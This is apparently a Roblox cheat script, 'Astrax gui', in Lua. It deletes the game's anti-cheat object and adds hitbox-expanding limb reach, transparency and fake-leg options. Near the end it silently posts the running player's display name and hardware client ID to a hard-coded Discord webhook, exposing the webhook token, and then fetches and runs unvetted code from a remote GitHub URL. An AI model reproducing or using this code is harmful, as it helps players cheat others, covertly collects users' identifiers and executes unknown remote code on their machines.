game.ReplicatedStorage.AntiCheatTrigger:Remove()
game:GetService("ReplicatedStorage").VARDisplay:Remove()
local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

local win = DiscordLib:Window("Astrax gui")

local serv = win:Server("Astrax | SBS", "")

local textbs = serv:Channel("Hitbox Expander")

textbs:Textbox("Both Leg Reach", "Type here!", true, function(t)
    game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new(t, 2, t)
    game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(t, 2, t)
    game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
    game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
    game.Players.LocalPlayer.Character["Right Leg"].Massless = true
    game.Players.LocalPlayer.Character["Left Leg"].Massless = true
end)

local textbs = serv:Channel("Leg Transparency")

textbs:Textbox("Leg Transparency/Right", "Type here!", true, function(l)
    game.Players.LocalPlayer.Character["Right Leg"].Transparency = l
end)

textbs:Textbox("Leg Transparency/Left", "Type here!", true, function(l)
    game.Players.LocalPlayer.Character["Left Leg"].Transparency = l
end)

local btns = serv:Channel("Fake Legs")

btns:Button("Fake Right Leg", function()
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer


    local solBacak = Player.Character["Left Leg"]
    local sagBacak = Player.Character["Right Leg"]


    local sahteBacak = Instance.new("Part")
    sahteBacak.Name = "Right Leg"
    sahteBacak.Size = Vector3.new(1, 2, 1) -- Bacak boyutunu ayarlayabilirsiniz
    sahteBacak.Transparency = 0 -- Bacak görünmez olacak
    sahteBacak.Parent = Player.Character


    local sahteBacakMotor6D = Instance.new("Motor6D")
    sahteBacakMotor6D.Name = "SahteSağBacakMotor6D"
    sahteBacakMotor6D.Part0 = Player.Character.Torso
    sahteBacakMotor6D.Part1 = sahteBacak
    sahteBacakMotor6D.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
    sahteBacakMotor6D.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0) -- Bacak pozisyonunu ayarlayabilirsiniz


    sahteBacakMotor6D.Parent = Player.Character.Torso

end)

btns:Button("Fake Left Leg", function()
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer
    
    
    local solBacak = Player.Character["Left Leg"]
    local sagBacak = Player.Character["Right Leg"]
    
    
    local sahteBacak = Instance.new("Part")
    sahteBacak.Name = "Left Leg"
    sahteBacak.Size = Vector3.new(1, 2, 1) -- Bacak boyutunu ayarlayabilirsiniz
    sahteBacak.Transparency = 0 -- Bacak görünmez olacak
    sahteBacak.Parent = Player.Character
    
    
    local sahteBacakMotor6D = Instance.new("Motor6D")
    sahteBacakMotor6D.Name = "SahteSolBacakMotor6D"
    sahteBacakMotor6D.Part0 = Player.Character.Torso
    sahteBacakMotor6D.Part1 = sahteBacak
    sahteBacakMotor6D.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    sahteBacakMotor6D.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    
    
    sahteBacakMotor6D.Parent = Player.Character.Torso

    end)

    local textbs = serv:Channel("Hand Reach")

    textbs:Textbox("Both Hand Reach", "Type here!", true, function(t)
        game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(t, t, 1)
        game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(t, t, 1)
        game.Players.LocalPlayer.Character["Right Arm"].CanCollide = false
        game.Players.LocalPlayer.Character["Left Arm"].CanCollide = false
        game.Players.LocalPlayer.Character["Right Arm"].Massless = true
        game.Players.LocalPlayer.Character["Left Arm"].Massless = true
    end)

    local textbs = serv:Channel("Arm Transparency")

    textbs:Textbox("Arm Transparency/Right", "Type here!", true, function(l)
        game.Players.LocalPlayer.Character["Right Arm"].Transparency = l
    end)
    
    textbs:Textbox("Leg Transparency/Left", "Type here!", true, function(l)
        game.Players.LocalPlayer.Character["Left Arm"].Transparency = l
    end)
    
    local btns = serv:Channel("Changer")

    btns:Button("Night Mode", function()
        local Lighting = game:GetService("Lighting")

        -- Gece ayarı
        Lighting.TimeOfDay = "1:00:00"
    end)

HttpService = game:GetService("HttpService")
Webhook_Url = "https://discord.com/api/webhooks/1147153620442288270/ZrFkdfL3qm7xiZbl0iVcdi_15Rwj58hjQMT12iKEiNySLRAEwi-9p7QYrgPkuk145aAt"

local responce = request(
{
    Url = Webhook_Url,
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "*Scriptin execute edildi!*",
            ["description"] = game.Players.localPlayer.DisplayName.." has executed the Astrax SBS script.",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                }
            }
        }}
    })
}
)
    loadstring(game:HttpGet"https://raw.githubusercontent.com/Raspelx/asayufga/main/e")()

win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")